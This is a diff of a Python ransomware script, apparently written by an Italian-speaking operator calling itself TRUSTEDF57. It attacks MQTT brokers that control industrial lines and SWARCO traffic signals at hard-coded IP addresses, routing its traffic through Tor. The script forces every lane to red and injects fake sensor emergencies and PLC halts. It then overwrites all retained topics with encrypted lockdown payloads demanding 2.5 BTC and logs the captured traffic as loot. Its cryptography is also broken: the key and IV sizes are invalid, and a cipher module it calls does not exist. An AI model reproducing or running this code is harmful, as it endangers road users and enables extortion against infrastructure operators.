@@ -1,139 +1,146 @@
 #!/usr/bin/env python3
-# MIL_RANSOMWARE_v2.0 - TRUSTEDF57 OPS
-# Kyber-1024 Post-Quantum + TOR Rotation + LCD-like UI
-import paho.mqtt.client as mqtt
-import json, time, threading, base64, os, socket, subprocess
-import qrcode
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import kyber
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-import socks, requests
-from stem import Signal
-from stem.control import Controller
+# MIL_RANSOMWARE_v2.2 - TRUSTEDF57 | POST-CHAOS AES LOCKDOWN
+# FASE 1: Caos visibile → FASE 2: AES cifratura totale retained
 
-class MilitaryRansomware:
+import paho.mqtt.client as mqtt
+import json, time, threading, base64, os, socket
+import socks
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+class SWARCORansomware:
     def __init__(self):
-        self.target_ip = "67.218.246.15"
-        self.broker_port = 1883
+        self.target_ip = "166.159.129.5"
+        self.port = 1883
         self.op_name = "TRUSTEDF57"
-        self.btc_addr = "INSERISCI_DA_WALLET"  # Sostituisci!
-        self.ransom_amount = "2.5"  # BTC
+        self.btc_addr = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        self.ransom = "2.5 BTC"
         
-        # Post-Quantum Kyber-1024
-        self.kyber_priv = kyber.Kyber1024PrivateKey.generate()
-        self.kyber_pub = self.kyber_priv.public_key()
-        self.enc_key = os.urandom(32)
+        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
+        self.iv = b'SWARCO_SEMAFORI_16'
         
-        # TOR Rotation ogni 10min
-        self.tor_controller = None
-        self.init_tor()
-        
-        self.mqtt_client = mqtt.Client("TRUSTEDF57-MIL-CMD", clean_session=False)
-        self.mqtt_client.on_connect = self.on_connect
-        self.mqtt_client.on_message = self.on_message
-        self.locked_status = False
-        
-    def init_tor(self):
-        """TOR SOCKS5 + Auto-Rotation"""
+        # TOR
         socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
         socket.socket = socks.socksocket
-        try:
-            with Controller.from_port(port=9051) as controller:
-                controller.authenticate()
-                controller.signal(Signal.NEWNYM)
-        except: pass
         
-    def rotate_tor(self):
-        """New circuit ogni 10min"""
-        while True:
-            time.sleep(600)
-            try:
-                with Controller.from_port(port=9051) as controller:
-                    controller.authenticate()
-                    controller.signal(Signal.NEWNYM)
-                print("[TOR] NEW CIRCUIT")
-            except: pass
-    
-    def lcd_ui(self):
-        """Military LCD Lock Screen"""
-        os.system('clear')
-        print("="*60)
-        print("🔴 MILITARY LOCKOUT ACTIVE - TRUSTEDF57 OPS")
-        print("="*60)
-        print(f"   TARGET: {self.target_ip} | MOSQUITTO 2.0.14")
-        print(f"   STATUS: {'🔒 PRODUCTION LOCKED' if self.locked_status else '⚠️  ARMING'}")
-        print(f"   WALLET: {self.btc_addr}")
-        print(f"   RANSOM: {self.ransom_amount} BTC")
-        print(f"   PQ-CRYPTO: KYBER-1024 | KEY-ID: {base64.b64encode(self.kyber_pub.public_bytes()).decode()[:16]}")
-        print("="*60)
-        print("   PAY OR PERMANENT SHUTDOWN INITIATED")
-        print("="*60)
-    
-    def deploy_lockout(self):
-        """Inject Ransom su tutti topic critici"""
-        payloads = {
-            # EMERGENCY STOP ALL
-            "Linea5ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("EMERGENCY_STOP"),
-            "Linea4ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("PLC_HALT"),
-            "MoliendaResultsFromCyclicRead/Plc": self.inject_military_payload("MILL_LOCKOUT"),
-            
-            # LCD Screens everywhere
-            "Linea5ResultsFromCyclicRead/Events": self.ransom_screen(),
-            "Linea4ResultsFromCyclicRead/Events": self.ransom_screen(),
-            "System/Diagnostics/P1-Sources/L4_L5_Molienda": self.ransom_screen(),
-            
-            # Persist (Retained)
-            "$SYS/broker/ransom/TRUSTEDF57": f"MIL-LOCK:{self.btc_addr}:{self.ransom_amount}"
-        }
+        self.mqtt_client = mqtt.Client("TRUSTEDF57_LOCKDOWN", clean_session=False)
+        self.mqtt_client.on_connect = self.on_connect
+        self.mqtt_client.on_message = self.on_message
         
-        for topic, payload in payloads.items():
-            self.mqtt_client.publish(topic, payload, qos=2, retain=True)
-            print(f"[INJECT] {topic} -> LOCKED")
-        self.locked_status = True
+        self.chaos_active = True      # FASE 1
+        self.aes_lockdown = False    # FASE 2
+        self.lockdown_time = 120     # 2min caos → lockdown
+        
+    def aes_encrypt_all(self, data):
+        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
+        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
     
-    def inject_military_payload(self, command):
-        """Payload con PQ-encrypt"""
-        data = {
-            "op": self.op_name,
-            "cmd": command,
-            "timestamp": time.time(),
-            "kyber_pub": base64.b64encode(self.kyber_pub.public_bytes()).decode()
-        }
-        return json.dumps(data)
-    
-    def ransom_screen(self):
-        """Full LCD ransom display"""
+    def lockdown_payload(self):
+        """TUTTO CIFRATO - non leggibile da PLC/SCADA"""
+        config_enc = self.aes_encrypt_all(json.dumps({
+            "STATUS": "AES_LOCKDOWN_ACTIVE",
+            "OP": self.op_name,
+            "BTC": self.btc_addr,
+            "DECRYPT_KEY_REQUIRED": self.aes_key.hex()
+        }))
+        
         return json.dumps({
-            "STATUS": "MILITARY_LOCKOUT",
-            "OP": "TRUSTEDF57",
-            "PAYMENT": f"{self.ransom_amount} BTC -> {self.btc_addr}",
-            "DECRYPT_KEY": "SEND_PROOF -> unlock@protonmail.com",
-            "COUNTDOWN": "48h -> PERMANENT_BRICK"
+            "LOCKDOWN": True,
+            "AES_CONFIG": config_enc,
+            "VERBOSE": "TRUSTEDF57_*AES_BLOCKED*",
+            "WILDCARD": "#",
+            "PLC_HALT": True
         })
     
+    def fase1_chaos(self):
+        """FASE 1: Caos visibile SEMAFORI/DISPLAY"""
+        chaos = [
+            {"topic": "traffic-triggers-output", "payload": json.dumps({
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
+                "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True}], "trigger_output": 31+i} for i in range(1,15)]
+            })},
+            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"MESSAGE": "🚨 TRUSTEDF57 HACKED 🚨", "BTC": self.btc_addr})},
+            {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"CONTATORI": "BLOCCATI", "PAGA": "2.5 BTC"})},
+            {"topic": "comhub-diagnostics", "payload": json.dumps({"com_hub_cpu_temperature": 999, "STATUS": "MIL_LOCKOUT"})},
+            {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": "TRUSTEDF57"})}
+        ]
+        
+        for p in chaos:
+            self.mqtt_client.publish(p["topic"], p["payload"], qos=2, retain=True)
+    
+    def fase2_lockdown(self):
+        """FASE 2: AES cifratura TOTALE - tutto retained bloccato"""
+        aes_payload = self.lockdown_payload()
+        
+        # CIFRA TUTTI I TOPICS CRITICI
+        critical_topics = [
+            "traffic-triggers-output", "traffic-statistic-output/#", 
+            "comhub-diagnostics", "plc-diagnostics", "sdlc-diagnostics",
+            "sensor-traffic-objects/#", "#", "traffic-triggers-output/+"
+        ]
+        
+        for topic in critical_topics:
+            self.mqtt_client.publish(topic, aes_payload, qos=2, retain=True)
+            print(f"🔒 AES_LOCKDOWN -> {topic}")
+    
+    def fake_emergency(self):
+        for sensor in ["sensor1","sensor2","sensor3"]:
+            self.mqtt_client.publish(f"sensor-traffic-objects/{sensor}", 
+                json.dumps({"EMERGENCY": "TRUSTEDF57", "speed": 999}), qos=2)
+    
     def on_connect(self, client, userdata, flags, rc):
-        print(f"[+] TRUSTEDF57 connesso a {self.target_ip}:{self.broker_port}")
-        client.subscribe("#", qos=2)  # Tutto
-        client.subscribe("$SYS/#", qos=1)
-        self.deploy_lockout()
+        print("✅ FASE1 CHAOS → FASE2 AES_LOCKDOWN")
+        client.subscribe("#", qos=2)
+        
+        # Thread caos + lockdown timer
+        threading.Thread(target=self.chaos_loop, daemon=True).start()
+        threading.Thread(target=self.lockdown_timer, daemon=True).start()
+        threading.Thread(target=self.emergency_loop, daemon=True).start()
+    
+    def chaos_loop(self):
+        while self.chaos_active:
+            self.fase1_chaos()
+            time.sleep(0.8)  # Spam aggressivo
+    
+    def lockdown_timer(self):
+        time.sleep(self.lockdown_time)
+        self.chaos_active = False
+        self.aes_lockdown = True
+        print("🔄 → FASE 2: AES TOTAL LOCKDOWN")
+        self.fase2_lockdown()
+    
+    def emergency_loop(self):
+        while True:
+            self.fake_emergency()
+            time.sleep(3)
     
     def on_message(self, client, userdata, msg):
-        payload = msg.payload.decode()
-        print(f"[EXFIL] {msg.topic}: {payload[:100]}...")
+        data = msg.payload.decode(errors='ignore')
+        print(f"[LOOT] {msg.topic}: {data[:80]}...")
         
-        # Encrypt + dump
-        enc_data = self.kyber_priv.encrypt(self.enc_key + payload.encode())
-        with open(f"mil_loot_{msg.topic.replace('/','_')}.kyber", "ab") as f:
-            f.write(enc_data + b"\n")
+        # Sempre exfil cifrato
+        enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
+        with open("swarco_total.aes", "ab") as f:
+            f.write(f"{enc_loot}\n".encode())
+    
+    def aes_encrypt_all(self, data):  # Overload per loot
+        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
+        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
     
     def run(self):
-        threading.Thread(target=self.rotate_tor, daemon=True).start()
         while True:
-            self.lcd_ui()
-            self.mqtt_client.loop(timeout=1)
-            time.sleep(2)
+            try:
+                self.mqtt_client.connect(self.target_ip, self.port, 60)
+                self.mqtt_client.loop_forever()
+            except Exception as e:
+                print(f"🔄 Reconnect: {e}")
+                time.sleep(3)
 
 if __name__ == "__main__":
-    print("TRUSTEDF57 MILITARY RANSOMWARE DEPLOY")
-    rw = MilitaryRansomware()
+    print("🚀 TRUSTEDF57 | FASE1→FASE2 AES_LOCKDOWN")
+    rw = SWARCORansomware()
     rw.run()
